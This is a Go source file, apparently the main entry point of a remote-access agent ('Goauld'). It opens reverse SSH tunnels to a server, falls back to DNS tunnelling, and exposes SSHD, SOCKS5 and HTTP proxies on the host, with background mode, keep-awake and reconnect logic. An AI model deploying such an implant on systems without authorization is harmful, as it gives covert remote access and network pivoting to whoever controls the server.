package main

import (
	"Goauld/agent/keepawake/keepawake"
	"Goauld/agent/proxy"
	"Goauld/agent/ssh/transport"
	"Goauld/common"
	"Goauld/common/utils"
	"context"
	"errors"
	"fmt"
	"net"
	"os"
	"os/signal"
	"strconv"
	"time"

	"Goauld/agent/config"
	"Goauld/agent/control"
	"Goauld/agent/socks"
	"Goauld/agent/ssh"
	"Goauld/agent/sshd"
	"Goauld/common/log"
	commonssh "Goauld/common/ssh"

	"github.com/cenkalti/backoff/v5"
)

func main() {
	// Initialize the agent using the provided parameters (Command line, configuration file, environment variable)
	_, err, warnings := config.InitAgent()
	if err != nil {
		log.Error().Err(err).Msg("error initializing the agent")
		return
	}
	if config.Get().DoPrintVersion() {
		fmt.Println(common.GetVersion())
		return
	}
	if len(warnings) > 0 {
		for _, warning := range warnings {
			log.Warn().Err(warning).Msgf("agent init error")
		}
	}
	if config.Get().ShouldRunInBackground() {
		err := config.Get().StartInBackground()
		if err != nil {
			log.Error().Err(err).Msg("error starting the agent in background")
		}
		return
	}
	if config.Get().DoGenerateConfig() {
		conf, err := config.Get().GenerateYAMLConfig()
		if err != nil {
			log.Error().Err(err).Msg("error generating the agent config")
			return
		}
		fmt.Println(conf)
		return
	}
	// Define an operation function that returns a value and an error.
	// The value can be any type.
	// We'll pass this operation to Retry function

	exp := &backoff.ExponentialBackOff{
		InitialInterval:     time.Second,
		RandomizationFactor: 2,
		Multiplier:          1.5,
		MaxInterval:         time.Minute,
	}
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	operation := func() (any, error) {
		log.Info().Msg("Starting agent")
		if config.Get().IsOutOfWorkingDay() {
			log.Warn().Msg("Agent running out of working day")
			return nil, errors.New("agent started out of working day")
		}
		cancelReason := run()
		if cancelReason == utils.Exit {
			log.Info().Msg("Agent stopped")
			cancel()
			time.Sleep(time.Second)
			return nil, nil
		}
		log.Info().Msg("Agent restarting")
		return nil, errors.New("")
	}

	result, err := backoff.Retry(ctx, operation, backoff.WithBackOff(exp), backoff.WithMaxTries(config.Get().GetMexRetries()))
	if err != nil {
		log.Info().Err(err).Msg("Agent shut down")
		return
	}
	if result != nil {
		fmt.Println(result)
	}
}

func run() utils.CancelReason {

	var dnsTransport *transport.DNSSH
	cancelReason := make(chan utils.CancelReason)
	controlErr := make(chan error)
	sshdErr := make(chan error)
	sshErr := make(chan error)
	socksErr := make(chan error)
	httpProxyErr := make(chan error)

	var forwardedPorts []commonssh.RemotePortForwarding

	// Announce to hanging goroutines that the configuration is completed
	configDone := make(chan struct{})
	log.Info().Msg("Agent init done")

	ctx, cancel := context.WithCancel(context.Background())
	globalCanceler := &utils.GlobalCanceler{
		Cancel:       cancel,
		CancelReason: cancelReason,
	}
	defer cancel()

	var controlPlanClient *control.ControlPlanClient
	var err error
	// Initialize the control socket.io

	// Every mode except DNS only mode
	if len(config.Get().GetRsshOrder()) != 1 || config.Get().GetRsshOrder()[0] != "DNS" {
		controlPlanClient = control.NewControlPlanClient(ctx, configDone, globalCanceler)
		err = controlPlanClient.Init()
		if err != nil {
			log.Error().Err(err).Msg("error initializing the control plan")
			log.Info().Err(err).Msg("trying to start the control plan in DNS mode")
		}
	}
	// If the standard init failed, or if we are in a DNS only mode
	if err != nil || len(config.Get().GetRsshOrder()) == 1 && config.Get().GetRsshOrder()[0] == "DNS" {
		log.Info().Msg("Initializing agent in DNS tunnel mode only")
		dnsTransport, err = transport.NewDNSSH()
		if err != nil {
			log.Error().Err(err).Msg("error initializing the DNS transport")
			return utils.Exit
		}
		defer dnsTransport.Close()
		controlPlanClient = control.NewControlPlanClient(ctx, configDone, globalCanceler)
		err = controlPlanClient.InitOverDns(dnsTransport.ControlStream)
		if err != nil {
			log.Error().Err(err).Msg("error initializing the control plan over DNS")
			return utils.Exit
		}
	}

	cancelCtrlC := HandleCtrlC(controlPlanClient, globalCanceler)
	defer cancelCtrlC()

	// Create the client SSH
	sshAgent := ssh.NewSSHAgent()
	// defer sshAgent.Close()

	// Start the control socket.io
	go func() {
		select {
		case controlErr <- controlPlanClient.Start():
		case <-ctx.Done():
		}
		controlPlanClient.Close()
	}()

	go func() {
		// Waiting for the configuration to be completed
		<-configDone
		// Initialize the client SSH
		err = sshAgent.Init(ctx, dnsTransport)
		if err != nil {
			log.Error().Err(err).Msg("error initializing the SSH")
			return
		}

		// If the SSHD server is enabled, start it
		if config.Get().SshdEnabled() {
			sshdServer := sshd.NewSshdServer(ctx)

			rListener, rPort, err := sshAgent.GetRemoteConn(config.Get().RemoteForwardedSshdAddress())
			if err != nil {
				log.Error().Err(err).Msg("error initializing the SSHD connection")
				return
			}
			config.Get().UpdateSshdPort(rPort)
			// config.Get().AddSshdToRpf()

			go func() {
				select {
				case sshdErr <- sshdServer.Serve(rListener):
					if err != nil {
						log.Error().Err(err).Msg("socks server error")
					}
					err := sshdServer.Close()
					if err != nil {
						log.Warn().Err(err).Msg("sshd close error")
					}
				case <-ctx.Done():

					log.Info().Msg("Closing SSHD connection")
					err := sshdServer.Close()
					if err != nil {
						log.Warn().Err(err).Msg("sshd close error")
					}
				}
			}()
			log.Info().Str("Remote port", strconv.Itoa(rPort)).Msg("Remote SSHD server started")
			forwardedPorts = append(forwardedPorts, commonssh.RemotePortForwarding{
				ServerPort: config.Get().RemoteForwardedSshdPort(),
				AgentPort:  -1,
				AgentIP:    "0.0.0.0",
				Tag:        "SSHD",
			})
		}

		// If the socks5 server is enabled, start it
		if config.Get().SocksEnabled() {
			socks5, err := socks.NewSocks()
			if err != nil {
				log.Error().Err(err).Msg("error initializing the Socks5 server")
			}
			rListener, rPort, err := sshAgent.GetRemoteConn(config.Get().RemoteForwardedSocksAddress())
			if err != nil {
				log.Error().Err(err).Msg("error initializing the Socks5 connection")
			}
			config.Get().UpdateSocksPort(rPort)
			go func() {
				select {
				case socksErr <- socks5.Serve(rListener):
					if err != nil {
						log.Error().Err(err).Msg("socks server error")
					}
					err := socks5.Close()
					if err != nil {
						log.Warn().Err(err).Msg("socks close error")
					}
				case <-ctx.Done():
					err := socks5.Close()
					if err != nil {
						log.Warn().Err(err).Msg("socks close error")
					}
				}
			}()
			log.Info().Str("Remote port", strconv.Itoa(rPort)).Msg("Remote Socks5 server started")
			forwardedPorts = append(forwardedPorts, commonssh.RemotePortForwarding{
				ServerPort: config.Get().RemoteForwardedSocksPort(),
				AgentPort:  -1,
				AgentIP:    "0.0.0.0",
				Tag:        "SOCKS",
			})
		}

		// If the HTTP proxy server is enabled, start it
		if config.Get().HttpProxyEnabled() {
			httpProxy := proxy.InitHttpProxy()

			listener, err := net.Listen("tcp4", "127.0.0.1:0")
			port := listener.Addr().(*net.TCPAddr).Port
			//rListener, rPort, err := sshAgent.GetRemoteConn(config.Get().RemoteForwardedHttpProxyAddress())
			if err != nil {
				log.Error().Err(err).Msg("error initializing the HTTP proxy connection")
			}
			rpf := commonssh.RemotePortForwarding{
				ServerPort: 0,
				AgentPort:  port,
				AgentIP:    "127.0.0.1",
				Tag:        "HTTP",
			}
			rPort, err := sshAgent.RemoteForward(rpf, ctx)

			config.Get().UpdateHttpProxyPort(rPort)

			go func() {
				select {
				case httpProxyErr <- httpProxy.Server.Serve(listener):
					if err != nil {
						log.Error().Err(err).Msg("HTTP proxy server error")
					}
					err := httpProxy.Server.Close()
					if err != nil {
						log.Warn().Err(err).Msg("HTTP proxy close error")
					}
				case <-ctx.Done():
					err := httpProxy.Server.Close()
					if err != nil {
						log.Warn().Err(err).Msg("HTTP proxy close error")
					}
				}
			}()

			log.Info().Str("Remote port", strconv.Itoa(rPort)).Msg("Remote HTTP proxy server started")
			forwardedPorts = append(forwardedPorts, commonssh.RemotePortForwarding{
				ServerPort: config.Get().RemoteForwardedHttpProxyPort(),
				AgentPort:  -1,
				AgentIP:    "0.0.0.0",
				Tag:        "HTTP",
			})
		}

		// For all porte forwards, launch the forwarding
		rpf := config.Get().GetRemotePortForwarding()
		for i := range rpf {
			port, err := sshAgent.RemoteForward(rpf[i], ctx)
			if err != nil {
				log.Error().Err(err).Str("Local", rpf[i].GetLocal()).Str("Remote", rpf[i].GetRemote()).Msg("error initializing the port forwarding")
				continue
			}
			rpf[i].ServerPort = port
			forwardedPorts = append(forwardedPorts, rpf[i])
			log.Info().Str("Local", rpf[i].GetLocal()).Str("Remote", rpf[i].GetRemote()).Msg("Port forwarding started")
		}

		err := controlPlanClient.SendPorts(forwardedPorts)
		if err != nil {
			log.Error().Err(err).Msg("error sending the forwarded ports")
		}
	}()

	if config.Get().KeepAwake() {
		keepAwaker := keepawake.Keeper{}
		err := keepAwaker.StartIndefinite()
		if err != nil {
			log.Warn().Err(err).Msg("error starting the keep awake")
		}
		go func() {
			select {
			case <-ctx.Done():
				err = keepAwaker.Stop()
				if err != nil {
					log.Warn().Err(err).Msg("keep awake close error")
				}
			}
		}()
	}
	// Wait for errors to occur and print them
	select {
	case err := <-controlErr:
		log.Error().Err(err).Msg("error starting the agent")
	case err := <-sshdErr:
		log.Error().Err(err).Msg("error starting the sshd server")
	case err := <-sshErr:
		log.Error().Err(err).Msg("error starting the ssh client")
	case err := <-socksErr:
		log.Error().Err(err).Msg("error starting the socks server")
	case err := <-httpProxyErr:
		log.Error().Err(err).Msg("error starting the http proxy")
	case <-ctx.Done():
		log.Error().Err(ctx.Err())
	}
	reason := <-cancelReason
	return reason
}

// HandleCtrlC intercepts the ctrl-c events.
// It signals to close all running goroutine, and wait one second to allow the agent to signal the disconnection
// to the server, then it exits.
func HandleCtrlC(controlPlanClient *control.ControlPlanClient, canceler *utils.GlobalCanceler) func() {
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt)
	go func() {
		for sig := range c {
			log.Info().Str("signal", sig.String()).Msg("received signal")
			log.Info().Msg("Shutting down control plan")
			canceler.Exit()
			controlPlanClient.Close()
		}
	}()
	return func() {
		signal.Stop(c)
	}
}
